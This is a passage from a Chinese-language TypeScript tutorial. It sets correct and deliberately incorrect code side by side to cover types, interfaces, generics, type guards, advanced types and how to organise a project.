888;let anyThing: any = true;let anyThing: any = null;let anyThing: any = undefined;// 变量如果在声明的时候，未指定其类型，那么它会被识别为任意值类型：let any;any =true;\n\n三、类型推论正确的写法\n// 如果没有明确的指定类型，那么 TypeScript 会依照类型推论（Type Inference）的规则推断出一个类型。let myFavoriteNumber = &#x27;seven&#x27;;  //等价于let myFavoriteNumber :string= &#x27;seven&#x27;;\n\n错误的写法\n// 第一句已经被推论为String类型了let myFavoriteNumber = &#x27;seven&#x27;;myFavoriteNumber = 7;❌\n\n四、联合类型正确的写法\n// 联合类型（Union Types）表示取值可以为多种类型中的一种。// 当你允许某个变量被赋值多种类型的时候,使用联合类型,管道符进行连接let myFavoriteNumber: string | number;myFavoriteNumber = &#x27;seven&#x27;;myFavoriteNumber = 7;// 也可用于方法的参数定义, 都有toString方法,访问 string 和 number 的共有属性是没问题的function getString(something: string | number): string &#123;    return something.toString();&#125;\n\n错误的写法\n// number类型没有length属性.所以编译错误,因为我们只能访问此联合类型的所有类型里共有的属性或方法：function getLength(something: string | number): number &#123;❌    return something.length;&#125;\n\n五、对象的类型——接口正确的写法\n// 赋值的时候，变量的形状必须和接口的形状保持一致(不能多也不能少,类型还必须一致)interface Person &#123;    name: string;    age: number;&#125;let tom: Person = &#123;    name: &#x27;Tom&#x27;,    age: 25&#125;;IUserInfo&#123;  age : any;//定义一个任何变量的 age.  userName :string;//定义一个 username.&#125;function getUserInfo(user : IUserInfo):string&#123;    return user.age+&quot;======&quot;+user.userName; \t&#125;  ➖➖➖➖➖➖➖➖➖可选属性➖➖➖➖➖➖➖➖➖interface Person &#123;    name: string;    age?: number; // 表示这个属性可有可无&#125;let tom: Person = &#123;    name: &#x27;Tom&#x27;&#125;;// 可索引签名interface StringArrary &#123;  [index]: string // 数字索引。通过数字索引，返回string类型  [string]: string // 字符串索引签名。两者不能混用，一起使用的前提是数字索引是字符串索引的子集&#125;let myArr: StringArrarymyArr = [&#x27;test1&#x27;,&#x27;test2&#x27;]let myString = myArr[0]  ➖➖➖➖➖➖➖➖➖任意属性➖➖➖➖➖➖➖➖➖//希望一个接口允许有任意的属性，可以使用如下方式：旦定义了任意属性，那么确定属性和可选属性的类型都必须是它的类型的子集interface Person &#123;    name: string;    age?: number;    [propName: string]: any;&#125;let tom: Person = &#123;    name: &#x27;Tom&#x27;,    gender: &#x27;male&#x27; // 可以加其他的属性&#125;;➖➖➖➖➖➖➖➖➖只读属性➖➖➖➖➖➖➖➖➖interface Person &#123;    readonly id: number; //     name: string;    age?: number;    [propName: string]: any;&#125;let tom: Person = &#123;    id: 89757, // 只读    name: &#x27;Tom&#x27;,    gender: &#x27;male&#x27;&#125;;\n\n错误的写法\n// 一旦定义了任意属性，那么确定属性和可选属性的类型都必须是它的类型的子集interface Person &#123;    name: string;    age?: number;    [propName: string]: string;&#125;let tom: Person = &#123;    name: &#x27;Tom&#x27;,    age: 25,    gender: &#x27;male&#x27;❌&#125;;上例中，任意属性的值允许是 string，但是可选属性 age 的值却是 number，number 不是 string 的子属性，所以报错了。➖➖➖➖➖➖➖➖➖只读属性➖➖➖➖➖➖➖➖➖interface Person &#123;    readonly id: number;    name: string;    age?: number;    [propName: string]: any;&#125;let tom: Person = &#123;    name: &#x27;Tom&#x27;,    gender: &#x27;male&#x27;&#125;;tom.id = 89757; // 不能被二次赋值❌\n\n数组只读属性\nlet myARr:readonlyArrary&lt;number&gt; = [1,2,3]\n\n六、数组的类型正确的做法\nlet fibonacci: number[] = [1, 1, 2, 3, 5];let fibonacci: Array&lt;number&gt; = [1, 1, 2, 3, 5];➖➖➖➖➖➖➖➖➖用接口表示数组➖➖➖➖➖➖➖➖➖interface NumberArray &#123;    [index: number]: number;&#125;let fibonacci: NumberArray = [1, 1, 2, 3, 5];➖➖➖➖➖➖➖➖➖any 在数组中的应用➖➖➖➖➖➖➖➖➖let list: any[] = [&#x27;Xcat Liu&#x27;, 25, &#123; website: &#x27;http://xcatliu.com&#x27; &#125;];➖➖➖➖➖➖➖➖➖类数组➖➖➖➖➖➖➖➖➖function sum() &#123;    let args: IArguments = arguments;&#125;\n\n错误的做法\n// 数组的项中不允许出现其他的类型：let fibonacci: number[] = [1, &#x27;1&#x27;, 2, 3, 5];❌// push 方法只允许传入 number 类型的参数，但是却传了一个 string 类型的参数，所以报错了。let fibonacci: number[] = [1, 1, 2, 3, 5];fibonacci.push(&#x27;8&#x27;);❌// 类数组（Array-like Object）不是数组类型，比如 argumentsfunction sum() &#123;❌    let args: number[] = arguments;&#125;\n\n七、函数的类型正确的做法\n// 需要把输入和输出都考虑到function sum(x: number, y: number): number &#123;    return x + y;&#125;➖➖➖➖➖➖➖➖➖函数表达式➖➖➖➖➖➖➖➖➖let mySum = function (x: number, y: number): number &#123;    return x + y;&#125;;// 不要混淆了 TypeScript 中的 =&gt; 和 ES6 中的 =&gt;let mySum: (x: number, y: number) =&gt; number = function (x: number, y: number): number &#123;    return x + y;&#125;;➖➖➖➖➖➖➖➖➖接口定义函数的形状➖➖➖➖➖➖➖➖➖interface SearchFunc &#123;    (source: string, subString: string): boolean;&#125;let mySearch: SearchFunc;mySearch = function(source, subString) &#123;    return source.search(subString) !== -1;&#125;➖➖➖➖➖➖➖➖➖可选参数➖➖➖➖➖➖➖➖➖function buildName(firstName: string, lastName?: string) &#123;    if (lastName) &#123;        return firstName + &#x27; &#x27; + lastName;    &#125; else &#123;        return firstName;    &#125;&#125;let tomcat = buildName(&#x27;Tom&#x27;, &#x27;Cat&#x27;);let tom = buildName(&#x27;Tom&#x27;);➖➖➖➖➖➖➖➖➖参数默认值➖➖➖➖➖➖➖➖➖function buildName(firstName: string, lastName: string = &#x27;Cat&#x27;) &#123;    return firstName + &#x27; &#x27; + lastName;&#125;➖➖➖➖➖➖➖➖➖剩余参数➖➖➖➖➖➖➖➖➖// rest 参数只能是最后一个参数，关于 rest 参数,是一个数组function push(array: any[], ...items: any[]) &#123;    items.forEach(function(item) &#123;        array.push(item);    &#125;);&#125;let a = [];push(a, 1, 2, 3);\n\n错误的做法\n// 输入多余的（或者少于要求的）参数，是不被允许的：function sum(x: number, y: number): number &#123;    return x + y;&#125;sum(1, 2, 3); ❌sum(1);❌// 输入多余的（或者少于要求的）参数，是不被允许的：function sum(x: number, y: number): number &#123;    return x + y;&#125;sum(1, 2, 3);// 可选参数后面不允许再出现必须参数了：function buildName(firstName?: string, lastName: string) &#123;❌    if (firstName) &#123;        return firstName + &#x27; &#x27; + lastName;    &#125; else &#123;        return lastName;    &#125;&#125;let tomcat = buildName(&#x27;Tom&#x27;, &#x27;Cat&#x27;);let tom = buildName(undefined, &#x27;Tom&#x27;);\n\n7.1 函数相关知识点梳理四种声明方式：\n\n通过function\n通过变量\n通过接口\n通过类型别名\n\n// 函数定义function add1(x: number, y: number) &#123;    return x + y&#125;// 通过变量let add2: (x: number, y: number) =&gt; number// 通过类型别名let add3 = (x: number, y: number) =&gt; number// 通过类型别名interface add4 &#123;    (x: number, y: number): number&#125;\n\n用interface定义函数和用type定义函数有区别?\n\ntype：不是创建新的类型，只是为一个给定的类型起一个名字。type还可以进行联合、交叉等操作，引用起来更简洁\ninterface：创建新的类型，接口之间还可以继承、声明合并\n如果可能，建议优先使用 interface。\n混合接口一般是为第三方类库写声明文件时会用到，很多类库名称可以直接当函数调用，也可以有些属性和方法。例子可以看一下@types/jest/index.d.ts 里面有一些混合接口。\n用混合接口声明函数和用接口声明类的区别是，接口不能声明类的构造函数（既不带名称的函数），但混合接口可以，其他都一样。\n\n函数重载\n函数名相同，返回类型不同\nfunction add8(...rest: number[]): number;function add8(...rest: string[]): string;function add8(...rest: any[]): any &#123;    let first = rest[0];    if(typeof first === &#x27;string&#x27;) &#123;        return rest.join(&#x27;&#x27;)    &#125;    if(typeof first === &#x27;number&#x27;) &#123;        return rest.reduce((pre, cur) =&gt; pre + cur)    &#125;&#125;\n\n八、类型断言\n有时候你会遇到这样的情况，你会比 TypeScript 更了解某个值的详细信息。 通常这会发生在你清楚地知道一个实体具有比它现有类型更确切的类型。\n通过类型断言这种方式可以告诉编译器，“相信我，我知道自己在干什么”。 类型断言好比其它语言里的类型转换，但是不进行特殊的数据检查和解构。 它没有运行时的影响，只是在编译阶段起作用。 TypeScript 会假设你，程序员，已经进行了必须的检查。\n\n类型断言有两种形式。 其一是“尖括号”语法：\nlet someValue: any = &#x27;this is a string&#x27;let strLength: number = (&lt;string&gt;someValue).length\n\n\n另一个为 as 语法：\n\nlet someValue: any = &#x27;this is a string&#x27;let strLength: number = (someValue as string).length\n\n\n两种形式是等价的。 至于使用哪个大多数情况下是凭个人喜好；然而，当你在 TypeScript 里使用 JSX时，只有as 语法断言是被允许\n\n正确的做法\n// 可以使用类型断言，将 something 断言成 stringfunction getLength(something: string | number): number &#123;    if ((&lt;string&gt;something).length) &#123;        return (&lt;string&gt;something).length;    &#125; else &#123;        return something.toString().length;    &#125;&#125;\n\n错误的做法\n// 只能访问此联合类型的所有类型里共有的属性或方法function getLength(something: string | number): number &#123; ❌    return something.length;&#125;\n\n九、类型别名正确的做法\n// 使用 type 创建类型别名,类型别名常用于联合类型type Name = string;type NameResolver = () =&gt; string;type NameOrResolver = Name | NameResolver;function getName(n: NameOrResolver): Name &#123;    if (typeof n === &#x27;string&#x27;) &#123;        return n;    &#125; else &#123;        return n();    &#125;&#125;\n\n十、枚举正确的做法\n// 枚举（Enum）类型用于取值被限定在一定范围内的场景，比如一周只能有七天\t// 枚举就是枚举值到枚举名进行反向映射enum Days &#123;Sun, Mon, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days[&quot;Sun&quot;]); // 0console.log(Days[0]); // &#x27;Sun&#x27;enum Days &#123;Sun = 7, Mon = 1, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days[&quot;Sun&quot;]); // 7\n\n十一、类正确的做法\n➖➖➖➖➖➖➖➖➖类➖➖➖➖➖➖➖➖➖class Animal &#123;    constructor(name) &#123;        this.name = name;    &#125;    sayHi() &#123;        return `My name is $&#123;this.name&#125;`;    &#125;&#125;let a = new Animal(&#x27;Jack&#x27;);console.log(a.sayHi()); // My name is Jack➖➖➖➖➖➖➖➖➖继承➖➖➖➖➖➖➖➖➖class Cat extends Animal &#123;    constructor(name) &#123;        super(name); // 调用父类的 constructor(name)        console.log(this.name);    &#125;    sayHi() &#123;        return &#x27;Meow, &#x27; + super.sayHi(); // 调用父类的 sayHi()    &#125;&#125;let c = new Cat(&#x27;Tom&#x27;); // Tomconsole.log(c.sayHi()); // Meow, My name is Tom➖➖➖➖➖➖➖➖➖存储器➖➖➖➖➖➖➖➖➖class Animal &#123;    constructor(name) &#123;        this.name = name;    &#125;    get name() &#123;        return &#x27;Jack&#x27;;    &#125;    set name(value) &#123;        console.log(&#x27;setter: &#x27; + value);        this.name = value;    &#125;&#125;let a = new Animal(&#x27;Kitty&#x27;); // setter: Kittya.name = &#x27;Tom&#x27;; // setter: Tomconsole.log(a.name); // Jack➖➖➖➖➖➖➖➖➖静态方法➖➖➖➖➖➖➖➖➖class Animal &#123;    static isAnimal(a) &#123;        return a instanceof Animal;    &#125;&#125;let a = new Animal(&#x27;Jack&#x27;);Animal.isAnimal(a); // true// 只能通过类名调用a.isAnimal(a); // TypeError: a.isAnimal is not a function ❌➖➖➖➖➖➖➖➖➖抽象类➖➖➖➖➖➖➖➖➖// 只能被继承，不能被实例化abstract class Animal &#123;  eat()&#123;    console.log(&#x27;eat&#x27;)  &#125;  abstract sleep(): void&#125;// 子类必须实现抽象类的抽象方法class Dog extends Animal &#123;    constructor(name: string) &#123;        super()        this.name = name    &#125;    name: string;    run() &#123;&#125;    sleep() &#123;        console.log(&#x27;dog sleep&#x27;)    &#125;&#125;let dog = new Dog(&#x27;wang&#x27;)dog.eat()\n\n11.1类与接口的关系interface Human &#123;    name: string;    eat(): void;&#125;// 实现接口中声明的属性class Person implements Human &#123;    constructor(name: string) &#123;        this.name = name    &#125;    name: string;    eat() &#123;&#125;&#125;// 接口可以像类一样实现继承interface Man extends Human &#123;    run(): voild&#125;interface Child &#123;    cry(): voild&#125;interface Boy extends Man,Child &#123;&#125;// 添加被继承过来的属性let body: Boy = &#123;    name: &#x27;xx&#x27;,    run() &#123;&#125;,    eat() &#123;&#125;,    cry() &#123;&#125;&#125;\n\n十二、public private 和 protected\npublic 修饰的属性或方法是公有的，可以在任何地方被访问到，默认所有的属性和方法都是 public 的\nprivate 修饰的属性或方法是私有的，不能在声明它的类的外部访问\nprotected 修饰的属性或方法是受保护的，它和 private 类似，区别是它在子类中也是允许被访问的\n\n十三、泛型\n更多详情 http://blog.poetries.top/ts-axios/chapter2/generic.html\n\n\n泛型就是解决 类 接口 方法的复用性、以及对不特定数据类型的支持。泛型理解为代表类型的参数，只是另一个维度的参数\n\n正确的做法\n//只能返回string类型的数据function getData(value:string):string&#123;  return value;&#125;//同时返回 string类型 和number类型  （代码冗余）function getData1(value:string):string&#123;  return value;&#125;function getData2(value:number):number&#123;  return value;&#125;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;使用泛型后就可以解决这个问题// T表示泛型，具体什么类型是调用这个方法的时候决定的// 表示参数是什么类型就返回什么类型~~~function getData&lt;T&gt;(value:T):T&#123;  return value;&#125;getData&lt;number&gt;(123);getData&lt;string&gt;(&#x27;1214231&#x27;);// 定义接口interface ConfigFn&#123;    &lt;T&gt;(value:T):T;&#125;var getData:ConfigFn=function&lt;T&gt;(value:T):T&#123;  return value;&#125;getData&lt;string&gt;(&#x27;张三&#x27;);getData&lt;string&gt;(1243);  //错误\n\n13.1 泛型函数和接口// 这两个等价的，使用时无需指定类型type Log = &lt;T&gt;(value: T) =&gt; T;// 只约束改成员interface Log &#123;  &lt;T&gt;(value: T):T&#125;// 这两个等价的，使用时必须指定类型type Log&lt;T&gt; = (value: T) =&gt; T;// 约束接口的所有成员interface Log&lt;T&gt; &#123;  (value: T):T&#125;\n\n13.2 泛型类与泛型约束// 把泛型放到类的后面，就可以约束所有成员class Log&lt;T&gt; &#123;    run(value: T) &#123;        return value    &#125;    // 不能约束静态成员   // static eat() // 报错&#125;// 实例化类 传入类型let log1 = new Log&lt;number&gt;()log1.run(1)// 不指定类型参数传任意都允许let log2 = new Log()log2.run(&#x27;1&#x27;)\n\n类型约束\ninterface Length &#123;    length: number&#125;// T继承了接口 约束了不是任意类型都可传。传入的参数必须有length属性function log&lt;T extends Length&gt;(value: T): T &#123;    console.log(value, value.length)    return value&#125;// 如数组、字符串、对象都有length属性log([1])log(&#x27;1&#x27;)log(&#123;a:1&#125;)\n\n\n函数和类可以轻松支持多种类型，增强程序的扩展性\n不必写多条函数重载\n灵活控制类型之间的约束\n\n对象属性约束\n// 泛型约束对象中的属性function getProp&lt;T,K extends keyof T&gt;(obj:T,key: K) &#123;    return obj[key]&#125;\n\n十四、类型检查机制14.1 类型检查机制\n编译器在做类型检查时，秉承的一些原则，表现出的一些行为\n\n作用：辅助开发，提高开发效率\n\n类型推断\n类型兼容性\n类型保护\n\n\n所谓类型推断：不需要指定变量的类型（函数的返回值类型），TS可以根据某些规则自动的为其推断出一个类型\n\n\n基础类型推断\n最佳通用类型推断\n上下文类型推断\n\n\n基础类型推断，从右向左。但是有些是从左向右推断\n\n如事件\n// ts 根据onkeydown推断出类型window.onkeydown = event=&gt;&#123;    console.log(event)&#125;\n\n\n通过类型断言阻断TS的类型推断\n\ninterface Foo &#123;    bar: number&#125;//let foo = &#123;&#125; as Foo//foo.bar = 1let foo: Foo = &#123;    bar: 1&#125;\n\n14.2 类型保护机制\n联合类型适合于那些值可以为不同类型的情况。 但当我们想确切地了解是否为 Fish 或者是 Bird 时怎么办？ JavaScript 里常用来区分这 2 个可能值的方法是检查成员是否存在。如之前提及的，我们只能访问联合类型中共同拥有的成员\n\n不同的判断方法有不同的使用场景：\n\ntypeof：判断一个变量的类型\ninstanceof：判断一个实例是否属于某个类\nin：判断一个属性是否属于某个对象\n类型保护函数：某些判断可能不是一条语句能够搞定的，需要更多复杂的逻辑，适合封装到一个函数内\n\nfunction getLanguage(type: Type) &#123;    let lang = type === type.Strong ? new Java(): new Javascript()        // 类型保护instanceof    if(lang instanceof Java)&#123;        lang.hellJava()    &#125;else &#123;        lang.hellJavaScript()    &#125;        // in    if(&#x27;java&#x27; in lang) &#123;        lang.hellJava()    &#125;else &#123;        lang.hellJavaScript()    &#125;        // 类型保护函数方式    if(isJava(lang)) &#123;        lang.hellJava()    &#125;else &#123;        lang.hellJavaScript()    &#125;&#125;// 创建一种类型保护函数function isJava(lang: Java | Javascript): lang is Java &#123;    // 类型断言    return (lang as Java).lang.helloJava !== undefined&#125;let pet = getSmallPet()// 每一个成员访问都会报错if (pet.swim) &#123;  pet.swim()&#125; else if (pet.fly) &#123;  pet.fly()&#125;\n\n为了让这段代码工作，我们要使用类型断言\nlet pet = getSmallPet()if ((pet as Fish).swim) &#123;  (pet as Fish).swim()&#125; else &#123;  (pet as Bird).fly()&#125;\n\n14.2.1 用户自定义的类型保护\n这里可以注意到我们不得不多次使用类型断言。如果我们一旦检查过类型，就能在之后的每个分支里清楚地知道 pet 的类型的话就好了。\nTypeScript 里的类型保护机制让它成为了现实。 类型保护就是一些表达式，它们会在运行时检查以确保在某个作用域里的类型。定义一个类型保护，我们只要简单地定义一个函数，它的返回值是一个类型谓词\n\nfunction isFish(pet: Fish | Bird): pet is Fish &#123;  return (pet as Fish).swim !== undefined&#125;\n\n\n在这个例子里，pet is Fish 就是类型谓词。谓词为 parameterName is Type 这种形式， parameterName必须是来自于当前函数签名里的一个参数名。\n每当使用一些变量调用 isFish 时，TypeScript 会将变量缩减为那个具体的类型\n\nif (isFish(pet)) &#123;  pet.swim()&#125;else &#123;  pet.fly()&#125;\n\n\n注意 TypeScript 不仅知道在 if 分支里 pet 是 Fish 类型；它还清楚在else 分支里，一定不是 Fish类型而是 Bird 类型\n\n14.2.2 typeof 类型保护我们可以像下面这样利用类型断言来写\nfunction isNumber (x: any):x is string &#123;  return typeof x === &#x27;number&#x27;&#125;function isString (x: any): x is string &#123;  return typeof x === &#x27;string&#x27;&#125;function padLeft (value: string, padding: string | number) &#123;  if (isNumber(padding)) &#123;    return Array(padding + 1).join(&#x27; &#x27;) + value  &#125;  if (isString(padding)) &#123;    return padding + value  &#125;  throw new Error(`Expected string or number, got &#x27;$&#123;padding&#125;&#x27;.`)&#125;\n\n\n然而，你必须要定义一个函数来判断类型是否是原始类型，但这并不必要。其实我们不必将 typeof x === &#39;number&#39;抽象成一个函数，因为 TypeScript 可以将它识别为一个类型保护。 也就是说我们可以直接在代码里检查类型了\n\nfunction padLeft (value: string, padding: string | number) &#123;  if (typeof padding === &#x27;number&#x27;) &#123;    return Array(padding + 1).join(&#x27; &#x27;) + value  &#125;  if (typeof padding === &#x27;string&#x27;) &#123;    return padding + value  &#125;  throw new Error(`Expected string or number, got &#x27;$&#123;padding&#125;&#x27;.`)&#125;\n\n\n这些 typeof 类型保护只有两种形式能被识别：typeof v === &quot;typename&quot; 和 typeof v !== &quot;typename&quot;， &quot;typename&quot;必须是 &quot;number&quot;， &quot;string&quot;，&quot;boolean&quot; 或 &quot;symbol&quot;。 但是 TypeScript 并不会阻止你与其它字符串比较，只是 TypeScript 不会把那些表达式识别为类型保护。\n\n14.2.3 instanceof 类型保护\n如果你已经阅读了 typeof 类型保护并且对 JavaScript 里的 instanceof 操作符熟悉的话，你可能已经猜到了这节要讲的内容。\ninstanceof 类型保护是通过构造函数来细化类型的一种方式。我们把之前的例子做一个小小的改造：\n\nclass Bird &#123;  fly () &#123;    console.log(&#x27;bird fly&#x27;)  &#125;  layEggs () &#123;    console.log(&#x27;bird lay eggs&#x27;)  &#125;&#125;class Fish &#123;  swim () &#123;    console.log(&#x27;fish swim&#x27;)  &#125;  layEggs () &#123;    console.log(&#x27;fish lay eggs&#x27;)  &#125;&#125;function getRandomPet () &#123;  return Math.random() &gt; 0.5 ? new Bird() : new Fish()&#125;let pet = getRandomPet()if (pet instanceof Bird) &#123;  pet.fly()&#125;if (pet instanceof Fish) &#123;  pet.swim()&#125;\n\n十五、高级类型15.1 交叉类型（取并集）\n交叉类型是将多个类型合并为一个类型。这让我们可以把现有的多种类型叠加到一起成为一种类型，它包含了所需的所有类型的特性。 例如，Person &amp; Loggable 同时是 Person 和 Loggable。就是说这个类型的对象同时拥有了这两种类型的成员。\n\n\n我们大多是在混入（mixins）或其它不适合典型面向对象模型的地方看到交叉类型的使用。 （在 JavaScript里发生这种情况的场合很多！）下面是如何创建混入的一个简单例子\n\nfunction extend&lt;T, U&gt; (first: T, second: U): T &amp; U &#123;  let result = &#123;&#125; as T &amp; U  for (let id in first) &#123;    result[id] = first[id] as any  &#125;  for (let id in second) &#123;    if (!result.hasOwnProperty(id)) &#123;      result[id] = second[id] as any    &#125;  &#125;  return result&#125;class Person &#123;  constructor (public name: string) &#123;  &#125;&#125;interface Loggable &#123;  log (): void&#125;class ConsoleLogger implements Loggable &#123;  log () &#123;    // ...  &#125;&#125;var jim = extend(new Person(&#x27;Jim&#x27;), new ConsoleLogger())var n = jim.namejim.log()interface DogInterface &#123;    run(): void&#125;interface CatInterface &#123;    jump(): void&#125;// pet 具备两个接口的所有方法let pet: DogInterface &amp; CatInterface = &#123;    run() &#123;&#125;,    jump() &#123;&#125;&#125;// 联合类型let a: number | string = 1let b: &#x27;a&#x27; | &#x27;b&#x27; | &#x27;c&#x27; // 字面量联合类型let c: 1 | 2 | 3 // 数字联合类型class Dog implements DogInterface &#123;    run() &#123;&#125;    eat() &#123;&#125;&#125;class Cat  implements CatInterface &#123;    jump() &#123;&#125;    eat() &#123;&#125;&#125;enum Master &#123; Boy, Girl &#125;function getPet(master: Master) &#123;    let pet = master === Master.Boy ? new Dog() : new Cat();    // pet.run()    // pet.jump()    pet.eat()    return pet&#125;interface Square &#123;    kind: &quot;square&quot;;    size: number;&#125;interface Rectangle &#123;    kind: &quot;rectangle&quot;;    width: number;    height: number;&#125;interface Circle &#123;    kind: &quot;circle&quot;;    radius: number;&#125;type Shape = Square | Rectangle | Circlefunction area(s: Shape) &#123;    switch (s.kind) &#123;        case &quot;square&quot;:            return s.size * s.size;        case &quot;rectangle&quot;:            return s.height * s.width;        case &#x27;circle&#x27;:            return Math.PI * s.radius ** 2        default:            return ((e: never) =&gt; &#123;throw new Error(e)&#125;)(s)    &#125;&#125;console.log(area(&#123;kind: &#x27;circle&#x27;, radius: 1&#125;))\n\n15.2 索引类型let obj = &#123;    a: 1,    b: 2,    c: 3&#125;// function getValues(obj: any, keys: string[]) &#123;//     return keys.map(key =&gt; obj[key])// &#125;function getValues&lt;T, K extends keyof T&gt;(obj: T, keys: K[]): T[K][] &#123;    return keys.map(key =&gt; obj[key])&#125;console.log(getValues(obj, [&#x27;a&#x27;, &#x27;b&#x27;]))// console.log(getValues(obj, [&#x27;d&#x27;, &#x27;e&#x27;]))// keyof Tinterface Obj &#123;    a: number;    b: string;&#125;let key: keyof Obj// T[K]let value: Obj[&#x27;a&#x27;]// T extends U\n\n15.3 映射类型interface Obj &#123;    a: string;    b: number;&#125;// 使得每个成员属性变为只读type ReadonlyObj = Readonly&lt;Obj&gt;// 把一个接口属性变为可选type PartialObj = Partial&lt;Obj&gt;// 抽取obj的子集type PickObj = Pick&lt;Obj, &#x27;a&#x27; | &#x27;b&#x27;&gt;type RecordObj = Record&lt;&#x27;x&#x27; | &#x27;y&#x27;, Obj&gt;\n\n15.4 条件类型// T extends U ? X : Ytype TypeName&lt;T&gt; =    T extends string ? &quot;string&quot; :    T extends number ? &quot;number&quot; :    T extends boolean ? &quot;boolean&quot; :    T extends undefined ? &quot;undefined&quot; :    T extends Function ? &quot;function&quot; :    &quot;object&quot;;type T1 = TypeName&lt;string&gt;type T2 = TypeName&lt;string[]&gt;// (A | B) extends U ? X : Y// (A extends U ? X : Y) | (B extends U ? X : Y)type T3 = TypeName&lt;string | string[]&gt;type Diff&lt;T, U&gt; = T extends U ? never : Ttype T4 = Diff&lt;&quot;a&quot; | &quot;b&quot; | &quot;c&quot;, &quot;a&quot; | &quot;e&quot;&gt;// Diff&lt;&quot;a&quot;, &quot;a&quot; | &quot;e&quot;&gt; | Diff&lt;&quot;b&quot;, &quot;a&quot; | &quot;e&quot;&gt; | Diff&lt;&quot;c&quot;, &quot;a&quot; | &quot;e&quot;&gt;// never | &quot;b&quot; | &quot;c&quot;// &quot;b&quot; | &quot;c&quot;type NotNull&lt;T&gt; = Diff&lt;T, null | undefined&gt;type T5 = NotNull&lt;string | number | undefined | null&gt;// Exclude&lt;T, U&gt;// NonNullable&lt;T&gt;// Extract&lt;T, U&gt;type T6 = Extract&lt;&quot;a&quot; | &quot;b&quot; | &quot;c&quot;, &quot;a&quot; | &quot;e&quot;&gt;// ReturnType&lt;T&gt;type T8 = ReturnType&lt;() =&gt; string&gt;\n\n15.5 联合类型\n联合类型与交叉类型很有关联，但是使用上却完全不同。 偶尔你会遇到这种情况，一个代码库希望传入 number 或 string 类型的参数。 例如下面的函数\n\nfunction padLeft(value: string, padding: any) &#123;  if (typeof padding === &#x27;number&#x27;) &#123;    return Array(padding + 1).join(&#x27; &#x27;) + value  &#125;  if (typeof padding === &#x27;string&#x27;) &#123;    return padding + value  &#125;  throw new Error(`Expected string or number, got &#x27;$&#123;padding&#125;&#x27;.`)&#125;padLeft(&#x27;Hello world&#x27;, 4) // returns &quot;    Hello world&quot;\n\n\npadLeft 存在一个问题，padding 参数的类型指定成了 any。 这就是说我们可以传入一个既不是 number 也不是 string 类型的参数，但是 TypeScript 却不报错\n\nlet indentedString = padLeft(&#x27;Hello world&#x27;, true) // 编译阶段通过，运行时报错\n\n\n为了解决这个问题，我们可以使用 联合类型做为 padding 的参数\n\nfunction padLeft(value: string, padding: string | number) &#123;  // ...&#125;let indentedString = padLeft(&#x27;Hello world&#x27;, true) // 编译阶段报错\n\n\n联合类型表示一个值可以是几种类型之一。我们用竖线（|）分隔每个类型，所以 number | string 表示一个值可以是 number或string。\n\n\n如果一个值是联合类型，我们只能访问此联合类型的所有类型里共有的成员\n\ninterface Bird &#123;  fly()  layEggs()&#125;interface Fish &#123;  swim()  layEggs()&#125;function getSmallPet(): Fish | Bird &#123;  // ...&#125;let pet = getSmallPet()pet.layEggs() // okaypet.swim()    // error\n\n\n这里的联合类型可能有点复杂：如果一个值的类型是 A | B，我们能够确定的是它包含了 A 和 B 中共有的成员。这个例子里，Fish 具有一个 swim 方法，我们不能确定一个 Bird | Fish类型的变量是否有 swim方法。 如果变量在运行时是 Bird 类型，那么调用 pet.swim()就出错了\n\n十六、初学者的困惑16.1 如何优雅的声明类型16.1.1 基础interface Basic &#123;  num: number;  str: string | null;  bol?: boolean;&#125;\n\n\n五种 JS 值类型就声明好了。那数组、函数呢？\n\ninterface Func &#123;  func(str: string): void;&#125;interface Arr &#123;  str: string[];  mixed: Array&lt;string | number&gt;;  fixedStructure: [string, number];  basics: Basic[];&#125;\n\n\n枚举类型也是很常用的，比如声明一个状态机的各个状态\n\nenum Status &#123;  Draft,  Published&#125;// 也可指定值enum Status &#123;  Draft = &#x27;Draft&#x27;,  Published = &#x27;Published&#x27;&#125;\n\n16.1.2 糅合独立声明\n\n一个 ts 文件只声明一个类型或者接口，文件名为需要暴露的类型名称，方便检索和管理\n\n就近声明\n\n当一个声明没有被外部引用或者依赖时，可以考虑就近放在使用的地方，典型的场景是 React 组件的 Props 和 State 的类型声明\n\n按职责分组\n\n在项目中，需要声明类型的可大致分为两类：一类是 model，也就是接口请求相关的，包括入参和出参；另一类是 view，界面渲染相关的。因此，我在 独立声明 的基础上，可以类型按照model 和 view 的维度进行分组，相互独立。\n那么问题来了，如果是独立的类型声明的话，怎么把 model 的数据应用到 view 呢？ 可能你需要一个 adapter 来做类型的的转换：DTOTypes -&gt; adapter -&gt; ViewTypes, 完成类似于将接口中的字符串映射成枚举类型这之类的转换\n\nany\n\n当遇到确实解决不了的类型报错的时候，as any 能带给你不一样的快感，但是不建议使用啊\n\n16.2 如何引用外部库\n在 JS 中，npm 上有丰富的海量的库帮我们完成日常的编码，可能并不是所有的库都能完全被应用到 TS 中，因为有些缺少类型声明\n\n比如，在 TS 中使用 react, 你会得到这样的一个类型检查错误：\n\n\n因为 react 的库中并没有类型声明\n现在比较通用的做法是，实现和类型实现独立成两个库，也就是你需要再安装类型声明的库: @types/react\n当遇到上述问题的时候，尝试安装一下 @types/[package]\n然而，并不是所有的库都有类型声明的实现，也会有很多不支持 TS 的存在，然而又必须得使用这个库的时候该怎么办？\n\n自己写声明\n\n以 progressbar.js为例，基本使用方法\n\nimport * as ProgressBar from &#x27;progressbar.js&#x27;;new ProgressBar.Circle(this.$progress, &#123;  strokeWidth: 8,  trailColor: &#x27;#e5e4e5&#x27;,  trailWidth: 8,  easing: &#x27;easeInOut&#x27;&#125;);\n\n我们需要对库中暴露出的 api 去做声明，对上述例子做个分解：暴露了 Circle 类，Circle 构造函数包含两个参数，一个 HTMLElement，一个 options. OK\n// 首先声明一下模块：declare module &#x27;progressbar.js&#x27; &#123;  // 模块中暴露了 Circle 类  export class Circle &#123;    constructor(container: HTMLElement, options: Options);  &#125;  // 构造函数的 Options 需要单独声明   interface Options &#123;    easing?: string;    strokeWidth?: number;    trailColor?: string;    trailWidth?: number;  &#125;&#125;\n\n\n如此我们便完成了一个简单的声明，当然实际使用中的 API 肯定比上述情况复杂，根据使用情况，用了哪些 API 或者参数，就补充那些的声明即可\n\n16.3 如何组织一个 TS 项目\nTS 项目的目录组织上，跟 JS 项目一样，补充好 types 的声明就可以了\n需要注意的是，将你希望对外暴露的能力相关的类型声明都暴露出去，不友好的声明会让接入你项目的人非常的痛苦，同时，在 package.json 中需要指定 type 